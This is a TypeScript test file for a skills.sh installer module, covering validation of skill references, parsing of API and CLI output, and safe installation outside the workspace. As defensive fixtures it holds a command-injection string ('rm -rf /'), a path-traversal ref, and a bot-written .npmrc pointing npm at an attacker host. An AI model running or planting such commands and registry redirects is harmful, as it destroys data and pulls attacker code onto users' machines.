import assert from 'node:assert/strict'
import { test } from 'node:test'
import {
  installSkill,
  parseSearchResponse,
  parseSkillsFindOutput,
  searchSkills,
  validateSkillRef,
} from './skills-sh'

test('validateSkillRef accepts owner/repo@skill and rejects shell-ish input', () => {
  assert.equal(validateSkillRef(' vercel-labs/agent-browser@agent-browser '), 'vercel-labs/agent-browser@agent-browser')
  assert.throws(() => validateSkillRef('vercel-labs/agent-browser'), /Invalid skill ref/)
  assert.throws(() => validateSkillRef('a/b@c; rm -rf /'), /Invalid skill ref/)
  assert.throws(() => validateSkillRef('../x/y@z'), /Invalid skill ref/)
})

test('parseSearchResponse maps the skills.sh API shape and sorts by installs', () => {
  const results = parseSearchResponse({
    skills: [
      { id: 'a/b/c', skillId: 'c', name: 'c', installs: 5, source: 'a/b' },
      { id: 'vercel-labs/agent-browser/agent-browser', skillId: 'agent-browser', name: 'agent-browser', installs: 772988, source: 'vercel-labs/agent-browser' },
    ],
  })
  assert.equal(results[0]?.ref, 'vercel-labs/agent-browser@agent-browser')
  assert.equal(results[0]?.url, 'https://skills.sh/vercel-labs/agent-browser/agent-browser')
  assert.equal(results[1]?.installs, 5)
  assert.deepEqual(parseSearchResponse({}), [])
})

test('parseSkillsFindOutput strips ANSI and reads owner/repo@skill lines', () => {
  const text = [
    '\x1b[38;5;102mInstall with\x1b[0m npx skills add <owner/repo@skill>',
    '',
    '\x1b[38;5;145msickn33/agentic-awesome-skills@browser-automation\x1b[0m \x1b[36m6.4K installs\x1b[0m',
    '\x1b[38;5;102m└ https://skills.sh/sickn33/agentic-awesome-skills/browser-automation\x1b[0m',
    '\x1b[38;5;145mweb-infra-dev/midscene-skills@browser-automation\x1b[0m \x1b[36m549 installs\x1b[0m',
    'x/y@z 12 installs',
  ].join('\n')
  const results = parseSkillsFindOutput(text)
  assert.equal(results.length, 3)
  assert.equal(results[0]?.ref, 'sickn33/agentic-awesome-skills@browser-automation')
  assert.equal(results[0]?.installs, 6400)
  assert.equal(results[1]?.installs, 549)
  assert.equal(results[2]?.ref, 'x/y@z')
  assert.equal(results[2]?.installs, 12)
})

test('searchSkills uses the API and falls back to the CLI when the API fails', async () => {
  const okFetch = (async () =>
    new Response(JSON.stringify({ skills: [{ id: 'a/b/c', skillId: 'c', name: 'c', installs: 1, source: 'a/b' }] }))) as typeof fetch
  const viaApi = await searchSkills('c', { fetchImpl: okFetch })
  assert.equal(viaApi[0]?.ref, 'a/b@c')

  const badFetch = (async () => new Response('nope', { status: 500 })) as typeof fetch
  const runner = async () => ({ code: 0, stdout: 'x/y@z 12 installs\n', stderr: '' })
  const viaCli = await searchSkills('z', { fetchImpl: badFetch, runner })
  assert.equal(viaCli[0]?.ref, 'x/y@z')
})

test('installSkill runs the skills CLI outside the workspace, then moves the skill in', async (t) => {
  const { mkdtempSync, mkdirSync, writeFileSync, rmSync } = await import('node:fs')
  const { join } = await import('node:path')
  const { tmpdir } = await import('node:os')
  const dir = mkdtempSync(join(tmpdir(), 'opendots-ws-'))
  t.after(() => rmSync(dir, { recursive: true, force: true }))

  const calls: { cmd: string; args: string[]; cwd: string }[] = []
  const runner = async (cmd: string, args: string[], opts: { cwd: string }) => {
    calls.push({ cmd, args, cwd: opts.cwd })
    mkdirSync(join(opts.cwd, '.claude', 'skills', 'agent-browser'), { recursive: true })
    writeFileSync(join(opts.cwd, '.claude', 'skills', 'agent-browser', 'SKILL.md'), '# x')
    return { code: 0, stdout: '', stderr: '' }
  }
  const result = await installSkill('vercel-labs/agent-browser@agent-browser', dir, { runner })
  assert.equal(result.skill, 'agent-browser')
  assert.equal(result.path, join(dir, '.claude', 'skills', 'agent-browser', 'SKILL.md'))
  const { existsSync } = await import('node:fs')
  assert.ok(existsSync(result.path), 'the skill lands in the workspace')
  const cwd = calls[0]!.cwd
  assert.notEqual(cwd, dir, 'npx must not run in the workspace: npm would read a bot-written .npmrc there')
  assert.ok(!cwd.startsWith(`${dir}/`), 'nor anywhere below it')
  assert.equal(existsSync(cwd), false, 'the staging directory is removed afterwards')
  assert.ok(calls[0]?.args.includes('vercel-labs/agent-browser@agent-browser'))

  const failing = async () => ({ code: 1, stdout: '', stderr: 'boom' })
  await assert.rejects(installSkill('a/b@c', dir, { runner: failing }), /boom/)
})

test('installSkill refuses to report success when the CLI exits 0 without writing a skill', async (t) => {
  const { mkdtempSync, mkdirSync, writeFileSync, rmSync } = await import('node:fs')
  const { join } = await import('node:path')
  const { tmpdir } = await import('node:os')
  const dir = mkdtempSync(join(tmpdir(), 'opendots-ws-'))
  t.after(() => rmSync(dir, { recursive: true, force: true }))

  // A skill an earlier turn installed: the old "newest SKILL.md" heuristic
  // would have handed this back and called the new install a success.
  mkdirSync(join(dir, '.claude', 'skills', 'already-here'), { recursive: true })
  writeFileSync(join(dir, '.claude', 'skills', 'already-here', 'SKILL.md'), '# old')

  const silent = async () => ({ code: 0, stdout: 'Skill already installed', stderr: '' })
  await assert.rejects(
    installSkill('vercel-labs/agent-browser@agent-browser', dir, { runner: silent }),
    /skills add exited 0 but wrote no skill — check that "vercel-labs\/agent-browser@agent-browser" exists on skills\.sh/,
  )
})

test('a bot-written .npmrc or package.json in the workspace never reaches the installer', async (t) => {
  const { mkdtempSync, mkdirSync, writeFileSync, rmSync } = await import('node:fs')
  const { join, relative, isAbsolute } = await import('node:path')
  const { tmpdir } = await import('node:os')
  const dir = mkdtempSync(join(tmpdir(), 'opendots-ws-'))
  t.after(() => rmSync(dir, { recursive: true, force: true }))
  writeFileSync(join(dir, '.npmrc'), 'registry=http://attacker.example/\n')
  writeFileSync(join(dir, 'package.json'), '{"name":"bait"}')

  let cwd = ''
  const runner = async (_cmd: string, _args: string[], opts: { cwd: string }) => {
    cwd = opts.cwd
    mkdirSync(join(opts.cwd, '.claude', 'skills', 's'), { recursive: true })
    writeFileSync(join(opts.cwd, '.claude', 'skills', 's', 'SKILL.md'), '# s')
    return { code: 0, stdout: '', stderr: '' }
  }
  await installSkill('o/r@s', dir, { runner })
  // npm looks for a project .npmrc by walking up from its cwd; the workspace must not be on that path.
  const rel = relative(dir, cwd)
  assert.ok(rel.startsWith('..') || isAbsolute(rel), `installer cwd ${cwd} must not be inside the workspace`)
})

test('re-installing a skill replaces it in one step and leaves no temporary folders behind', async (t) => {
  const { mkdtempSync, mkdirSync, writeFileSync, readFileSync, readdirSync, rmSync } = await import('node:fs')
  const { join } = await import('node:path')
  const { tmpdir } = await import('node:os')
  const dir = mkdtempSync(join(tmpdir(), 'opendots-ws-'))
  t.after(() => rmSync(dir, { recursive: true, force: true }))
  mkdirSync(join(dir, '.claude', 'skills', 's'), { recursive: true })
  writeFileSync(join(dir, '.claude', 'skills', 's', 'SKILL.md'), '# old')

  const runner = async (_cmd: string, _args: string[], opts: { cwd: string }) => {
    mkdirSync(join(opts.cwd, '.claude', 'skills', 's'), { recursive: true })
    writeFileSync(join(opts.cwd, '.claude', 'skills', 's', 'SKILL.md'), '# new')
    return { code: 0, stdout: '', stderr: '' }
  }
  const result = await installSkill('o/r@s', dir, { runner })
  assert.equal(readFileSync(result.path, 'utf8'), '# new')
  assert.deepEqual(readdirSync(join(dir, '.claude', 'skills')), ['s'], 'no half-copied or backup folder is left next to it')
})
